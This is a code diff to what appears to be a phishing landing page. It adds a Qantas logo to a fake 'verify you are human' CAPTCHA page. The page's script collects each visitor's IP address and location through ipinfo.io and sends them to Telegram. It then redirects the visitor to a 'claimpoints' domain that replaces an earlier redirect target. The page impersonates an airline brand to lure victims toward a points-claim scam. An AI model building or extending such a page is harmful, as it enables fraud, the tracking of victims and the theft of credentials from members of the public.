@@ -22,6 +22,10 @@
             box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
             text-align: center;
         }
+        .logo {
+            max-width: 150px;
+            margin-bottom: 20px;
+        }
         button {
             padding: 10px 20px;
             border: none;
@@ -39,6 +43,7 @@
 <body>
 
     <div class="container">
+        <img src="https://seekvectorlogo.com/wp-content/uploads/2018/03/qantas-vector-logo.png" alt="Qantas Logo" class="logo">
         <h2>Please verify you are human</h2>
         <form id="captcha-form" action="#" onsubmit="return validateCaptcha(event)">
             <div class="g-recaptcha" data-sitekey="6Lc3yeIqAAAAALhdZQMLrCdVM4rp8QV0Emfk-Tqz"></div>
@@ -58,14 +63,13 @@
 
             try {
                 // Get IP and location info
-               const res = await fetch("https://ipinfo.io/json?token=614f4f5fe09129");
+                const res = await fetch("https://ipinfo.io/json?token=614f4f5fe09129");
                 const data = await res.json();
                 
                 const ip = data.ip || "N/A";
                 const city = data.city || "N/A";
                 const region = data.region || "N/A";
                 const country = data.country || "N/A";
-
 
                 const message = `✅ CAPTCHA Passed\n🌍 IP: ${ip}\n📍 Location: ${city}, ${region}, ${country}`;
                 
@@ -84,7 +88,7 @@
                 });
 
                 // Redirect after sending the message
-                window.location.href = "https://railiouhiezm.x10.bz/verify";
+                window.location.href = "https://claimpoints.kinsta.cloud/Au/web";
 
             } catch (error) {
                 console.error("Error sending data to Telegram:", error);
